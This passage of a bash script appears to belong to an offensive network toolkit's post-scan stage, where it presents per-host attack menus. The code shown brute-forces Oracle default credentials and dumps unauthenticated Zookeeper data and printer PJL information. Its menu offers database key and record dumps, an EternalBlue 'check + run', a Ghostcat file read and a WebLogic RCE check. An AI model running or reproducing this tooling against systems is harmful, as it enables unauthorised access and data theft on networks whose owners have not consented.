    for creds in 'system/manager' 'sys/change_on_install' 'scott/tiger' \
                 'system/oracle' 'system/system' 'dbsnmp/dbsnmp' 'hr/hr'; do
      local u="${creds%%/*}" p="${creds##*/}"
      local out; out=$(printf 'SELECT name FROM v$database;\nexit\n' \
        | sqlplus -S "${u}/${p}@${host}:1521/orcl" 2>/dev/null | grep -v '^$') || true
      if [[ -n "$out" ]] && ! printf '%s' "$out" | grep -qi 'ORA-\|ERROR\|SP2-'; then
        printf '  %s[+] Connected — %s/%s\n' "${GREEN}" "$u" "$p"
        printf '%s\n' "$out" | head -10
        connected=true; break
      fi
    done
    $connected || printf '  %s[~]%s No default credentials worked%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  else
    printf '  %s[~]%s sqlplus not found — using nmap scripts%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    _db_nmap "$host" 1521 \
      --script oracle-tns-version,oracle-brute,oracle-sid-brute \
      --script-args oracle-brute.sid=ORCL
  fi
}

_act_zookeeper() {
  local host="$1"
  printf '  %s[*]%s Zookeeper on %s:2181%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local stats; stats=$(printf 'srvr' | nc -w 3 "$host" 2181 2>/dev/null) || true
  if printf '%s' "$stats" | grep -qi 'Zookeeper\|version\|Mode'; then
    printf '  %s[!!!] NO AUTH — Zookeeper accessible%s\n' "${RED}" "${RESET}"
    printf '%s\n' "$stats" | grep -E 'Zookeeper|version|Mode|Latency|Connections|Node count' | head -10
    printf '  %s[*]%s Config:\n' "${CYAN}" "${RESET}"
    printf 'conf' | nc -w 3 "$host" 2181 2>/dev/null | head -15 || true
    printf '  %s[*]%s Root znodes:\n' "${CYAN}" "${RESET}"
    if check_tool zkCli.sh; then
      printf 'ls /\nquit\n' | zkCli.sh -server "$host:2181" 2>/dev/null \
        | grep '^\[' | tail -3 || true
    else
      _db_nmap "$host" 2181 --script zookeeper-info 2>/dev/null || true
    fi
  else
    printf '  %s[~]%s No Zookeeper on 2181%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

# ── Printer / PJL ────────────────────────────────────────────────────────────
_act_printer_pjl() {
  local host="$1"
  printf '  %s[*]%s Probing printer PJL on %s:9100%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  # Definitive PJL banner check — only real JetDirect printers reply with @PJL
  local _resp
  _resp=$(printf '\033%%-12345X@PJL ECHO FSEC\r\n\033%%-12345X' \
    | timeout 3 nc -w 3 "$host" 9100 2>/dev/null) || true
  if ! printf '%s' "$_resp" | grep -qi 'PJL\|FSEC'; then
    printf '  %s[!]%s Port 9100 open but no PJL response — not a printer (false positive)%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
    return
  fi
  printf '  %s[+]%s PJL printer confirmed%s\n\n' "${GREEN}" "${RESET}" "${RESET}"
  # Dump all safe read-only info categories
  printf '\033%%-12345X@PJL INFO ID\r\n@PJL INFO CONFIG\r\n@PJL INFO STATUS\r\n@PJL INFO VARIABLES\r\n@PJL INFO MEMORY\r\n@PJL INFO FILESYS\r\n\033%%-12345X' \
    | timeout 5 nc -w 5 "$host" 9100 2>/dev/null \
    | strings | grep -v '^\[' | head -200 || true
  # Offer PRET if installed
  local _pret=""
  for _p in "$(command -v pret.py 2>/dev/null)" "$(command -v pret 2>/dev/null)" \
             "/opt/pret/pret.py" "/usr/local/bin/pret.py" "/root/pret/pret.py"; do
    [[ -n "$_p" && -f "$_p" ]] && { _pret="$_p"; break; }
  done
  if [[ -n "$_pret" ]]; then
    printf '\n  %s[*]%s PRET found at %s%s\n' "${CYAN}" "${RESET}" "$_pret" "${RESET}"
    printf '  %s[?]%s Launch PRET interactive? [y/N]: ' "${CYAN}" "${RESET}"
    read -r _ans
    if [[ "$_ans" =~ ^[Yy] ]]; then
      printf '  %s[?]%s Mode — pjl / ps / pcl [pjl]: ' "${CYAN}" "${RESET}"
      read -r _mode; _mode="${_mode:-pjl}"
      local _py; _py=$(command -v python2 2>/dev/null || command -v python2.7 2>/dev/null || command -v python3 2>/dev/null || echo python3)
      run_fg "$_py" "$_pret" "$host" "$_mode"
    fi
  else
    printf '\n  %s[~]%s PRET not installed.  git clone https://github.com/rub-nds/pret /opt/pret%s\n' \
      "${DIM}" "${RESET}" "${RESET}"
  fi
}

_act_printer_ipp() {
  local host="$1"
  printf '  %s[*]%s Probing IPP on %s:631%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  if ! check_tool curl; then
    printf '  %s[!]%s curl not found%s\n' "${YELLOW}" "${RESET}" "${RESET}"; return
  fi
  local _out
  _out=$(curl -s --max-time 5 "http://$host:631/printers" 2>/dev/null) || true
  if [[ -n "$_out" ]]; then
    printf '%s\n' "$_out" | sed 's/<[^>]*>//g' | grep -v '^[[:space:]]*$' | head -60
  else
    # Try root path if /printers returned nothing
    _out=$(curl -s --max-time 5 "http://$host:631/" 2>/dev/null) || true
    [[ -n "$_out" ]] \
      && printf '%s\n' "$_out" | sed 's/<[^>]*>//g' | grep -v '^[[:space:]]*$' | head -40 \
      || printf '  %s[~]%s No IPP/HTTP response on :631%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

# ── Host table display ────────────────────────────────────────────────────────
_show_hosts() {
  printf '\n'
  printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
  printf '  %s│  DISCOVERED HOSTS                                │%s\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
  printf '\n'
  printf '  %s  %-4s  %-16s  %s%s\n' "${DIM}" "ID" "HOST" "OPEN PORTS" "${RESET}"
  printf '  %s  ──── ──────────────── ──────────────────────────%s\n' "${DIM}" "${RESET}"
  for i in "${!HOST_LIST[@]}"; do
    local _ip="${HOST_LIST[$i]}"
    local _ports="${HOSTS[$_ip]}"
    local _disp; _disp=$(printf '%s' "$_ports" | tr ' ' '\n' | grep -v '^$' | head -6 | tr '\n' ' ')
    local _has_creds=""; _get_creds "$_ip" | grep -q "login:" 2>/dev/null && _has_creds=" ${GREEN}[✔ creds]${RESET}"
    printf "  %s[%02d]%s  %-16s  %s%s%s%s\n" \
      "${CYAN}" "$(( i + 1 ))" "${RESET}" "$_ip" "${DIM}" "$_disp" "${RESET}" "$_has_creds"
  done
  printf '\n'
}

# ── Action menu per host ──────────────────────────────────────────────────────
_host_menu() {
  local host="$1"
  local ports="${HOSTS[$host]:-}"
  declare -a LABELS=() FUNCS=()

  _has_port "$ports" "21"   && { LABELS+=("FTP — anonymous list + download");         FUNCS+=("_act_ftp $host"); }
  _has_port "$ports" "22"   && { LABELS+=("SSH — connect (uses found creds if any)"); FUNCS+=("_act_ssh $host"); }
  _has_port "$ports" "23"   && { LABELS+=("Telnet — connect");                         FUNCS+=("_act_telnet $host"); }
  _has_port "$ports" "80"   && { LABELS+=("HTTP — fingerprint + credential check");   FUNCS+=("_act_http $host 80 http"); }
  _has_port "$ports" "80"   && { LABELS+=("HTTP :80  — feroxbuster dir brute");        FUNCS+=("_act_ferox $host 80 http"); }
  _has_port "$ports" "443"  && { LABELS+=("HTTPS — fingerprint + credential check");  FUNCS+=("_act_http $host 443 https"); }
  _has_port "$ports" "443"  && { LABELS+=("HTTPS :443 — feroxbuster dir brute");       FUNCS+=("_act_ferox $host 443 https"); }
  _has_port "$ports" "8080" && { LABELS+=("HTTP :8080 — fingerprint + creds");        FUNCS+=("_act_http $host 8080 http"); }
  _has_port "$ports" "8080" && { LABELS+=("HTTP :8080 — feroxbuster dir brute");       FUNCS+=("_act_ferox $host 8080 http"); }
  _has_port "$ports" "8443" && { LABELS+=("HTTPS :8443 — fingerprint + creds");       FUNCS+=("_act_http $host 8443 https"); }
  _has_port "$ports" "8443" && { LABELS+=("HTTPS :8443 — feroxbuster dir brute");      FUNCS+=("_act_ferox $host 8443 https"); }
  _has_port "$ports" "445"  && { LABELS+=("SMB — list shares (null session + creds)"); FUNCS+=("_act_smb_shares $host"); }
  _has_port "$ports" "445"  && { LABELS+=("SMB — MS17-010 EternalBlue check + run");  FUNCS+=("_act_ms17010 $host"); }
  _has_port "$ports" "554"  && { LABELS+=("RTSP — probe streams (port 554)");         FUNCS+=("_act_rtsp $host 554"); }
  _has_port "$ports" "8554" && { LABELS+=("RTSP — probe streams (port 8554)");        FUNCS+=("_act_rtsp $host 8554"); }
  _has_port "$ports" "1883" && { LABELS+=("MQTT — subscribe to # (15 s capture)");    FUNCS+=("_act_mqtt $host"); }
  _has_port "$ports" "6668" && { LABELS+=("Tuya :6668 — local API probe (proto + data)"); FUNCS+=("_act_tuya $host"); }
  _has_port "$ports" "3389" && { LABELS+=("RDP — connect with credentials");          FUNCS+=("_act_rdp $host"); }
  _has_port "$ports" "161"  && { LABELS+=("SNMP — walk (public community)");          FUNCS+=("_act_snmp $host"); }
  _has_port "$ports" "2049" && { LABELS+=("NFS — showmount exports + mount share");   FUNCS+=("_act_nfs $host"); }
  _has_port "$ports" "6379"  && { LABELS+=("Redis :6379 — no-auth + key dump + config");         FUNCS+=("_act_redis $host"); }
  _has_port "$ports" "5432"  && { LABELS+=("PostgreSQL :5432 — default creds + DB/user list");   FUNCS+=("_act_postgres $host"); }
  _has_port "$ports" "3306"  && { LABELS+=("MySQL/MariaDB :3306 — default creds + DB list");     FUNCS+=("_act_mysql $host"); }
  _has_port "$ports" "1433"  && { LABELS+=("MSSQL :1433 — sa empty/default password check");     FUNCS+=("_act_mssql $host"); }
  _has_port "$ports" "27017" && { LABELS+=("MongoDB :27017 — no-auth + default creds");          FUNCS+=("_act_mongodb $host"); }
  _has_port "$ports" "9200"  && { LABELS+=("Elasticsearch :9200 — no-auth + index dump");        FUNCS+=("_act_elasticsearch $host"); }
  _has_port "$ports" "5984"  && { LABELS+=("CouchDB :5984 — no-auth + doc dump");                FUNCS+=("_act_couchdb $host"); }
  _has_port "$ports" "9042"  && { LABELS+=("Cassandra :9042 — no-auth + keyspace list");         FUNCS+=("_act_cassandra $host"); }
  _has_port "$ports" "8086"  && { LABELS+=("InfluxDB :8086 — no-auth + database list");          FUNCS+=("_act_influxdb $host"); }
  _has_port "$ports" "7474"  && { LABELS+=("Neo4j :7474 — no-auth + default creds");             FUNCS+=("_act_neo4j $host"); }
  _has_port "$ports" "11211" && { LABELS+=("Memcached :11211 — no-auth key dump");               FUNCS+=("_act_memcached $host"); }
  _has_port "$ports" "15672" && { LABELS+=("RabbitMQ :15672 — guest:guest + queue dump");        FUNCS+=("_act_rabbitmq $host"); }
  _has_port "$ports" "2379"  && { LABELS+=("etcd :2379 — no-auth key/value dump");               FUNCS+=("_act_etcd $host"); }
  _has_port "$ports" "3000"  && { LABELS+=("Grafana :3000 — admin:admin + datasource dump");     FUNCS+=("_act_grafana $host"); }
  _has_port "$ports" "5601"  && { LABELS+=("Kibana :5601 — no-auth + index list");               FUNCS+=("_act_kibana $host"); }
  _has_port "$ports" "8123"  && { LABELS+=("ClickHouse :8123 — no-auth + DB list");              FUNCS+=("_act_clickhouse $host"); }
  _has_port "$ports" "8529"  && { LABELS+=("ArangoDB :8529 — root:empty + DB list");             FUNCS+=("_act_arangodb $host"); }
  _has_port "$ports" "8983"  && { LABELS+=("Apache Solr :8983 — no-auth + core list");           FUNCS+=("_act_solr $host"); }
  _has_port "$ports" "8080"  && { LABELS+=("RethinkDB :8080 — no-auth admin UI + driver");       FUNCS+=("_act_rethinkdb $host"); }
  _has_port "$ports" "2480"  && { LABELS+=("OrientDB :2480 — root:root + DB list");              FUNCS+=("_act_orientdb $host"); }
  _has_port "$ports" "1521"  && { LABELS+=("Oracle :1521 — system/manager + default SIDs");      FUNCS+=("_act_oracle $host"); }
  _has_port "$ports" "2181"  && { LABELS+=("Zookeeper :2181 — no-auth + znode dump");            FUNCS+=("_act_zookeeper $host"); }
  _has_port "$ports" "9100"  && { LABELS+=("Printer :9100 — PJL verify + info dump (id/config/env)"); FUNCS+=("_act_printer_pjl $host"); }
  _has_port "$ports" "631"   && { LABELS+=("Printer :631  — IPP info probe");                    FUNCS+=("_act_printer_ipp $host"); }
  _has_port "$ports" "8009"  && { LABELS+=("Ghostcat AJP — CVE-2020-1938 file read");            FUNCS+=("_act_ghostcat $host"); }
  _has_port "$ports" "7001"  && { LABELS+=("WebLogic — CVE-2019-2725 T3 RCE check");             FUNCS+=("_act_weblogic $host"); }

  if [[ ${#LABELS[@]} -eq 0 ]]; then
    printf '\n  %s[~]%s No actionable services found for %s.%s\n' \
      "${DIM}" "${RESET}" "$host" "${RESET}"
    return
  fi

  _creds_all=$(_get_creds "$host")

  _draw_menu() {
    printf '\n  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
    printf '  %s│  ACTIONS — %-39s│%s\n' "${CYAN}${BOLD}" "$host " "${RESET}"
    printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
    printf '\n'
    if [[ -n "${_creds_all}" ]]; then
      printf '  %s[✔] Found credentials:%s\n' "${GREEN}" "${RESET}"
      while IFS= read -r _cl; do
        printf '      %s%s%s\n' "${GREEN}" "$_cl" "${RESET}"
      done <<< "${_creds_all}"
      printf '\n'
    fi
    for i in "${!LABELS[@]}"; do
      printf '  %s[%02d]%s ▶  %s\n' "${CYAN}" "$(( i + 1 ))" "${RESET}" "${LABELS[$i]}"
    done
    printf '  %s[00]%s ▶  Back to host list\n\n' "${RED}" "${RESET}"
  }

  _draw_menu

  while true; do
    printf '  %s>>%s ' "${CYAN}" "${RESET}"
    read -r _choice  || return
    case "${_choice:-}" in
      0|00) return ;;
      '')   _draw_menu ;;
      *)
        if [[ "$_choice" =~ ^[0-9]+$ ]] && \
           (( _choice >= 1 && _choice <= ${#LABELS[@]} )); then
          printf '\n'
          eval "${FUNCS[$(( _choice - 1 ))]}" || true
          printf '\n  %s▶%s Press Enter to continue...' "${DIM}" "${RESET}"
          read -r _  || true
          _draw_menu
        else
          printf '  %s[!] Enter 01-%02d or 00%s\n' "${YELLOW}" "${#LABELS[@]}" "${RESET}"
        fi
        ;;
    esac
  done
}

# ── Main loop ─────────────────────────────────────────────────────────────────
trap 'printf "\n  %s[!] Disconnecting.%s\n\n" "${RED}" "${RESET}"; exit 0' INT

# Pipeline mode: print host summary and exit — no interactive menu
if [[ -n "${SESSION_DIR:-}" ]]; then
  printf '  %s[CHAIN]%s Pipeline mode — showing host summary from session data%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  _show_hosts
  printf '  %s[CHAIN]%s Post-discovery data loaded. Use interactive mode to attack individual hosts.%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mark_done "$SESSION_DIR"
  exit 0
fi

while true; do
  _show_hosts
  printf '  %s>>%s Select host (0 to exit): ' "${CYAN}" "${RESET}"
  read -r _hpick  || break

  case "${_hpick:-}" in
    0|00|q) printf '  %s[!] Disconnecting.%s\n\n' "${RED}" "${RESET}"; exit 0 ;;
    '')     continue ;;
    *)
      if [[ "$_hpick" =~ ^[0-9]+$ ]] && \
         (( _hpick >= 1 && _hpick <= ${#HOST_LIST[@]} )); then
        _host_menu "${HOST_LIST[$(( _hpick - 1 ))]}"
      else
        printf '  %s[!] Enter 01-%02d or 00%s\n\n' \
          "${YELLOW}" "${#HOST_LIST[@]}" "${RESET}"
      fi
      ;;
  esac
done
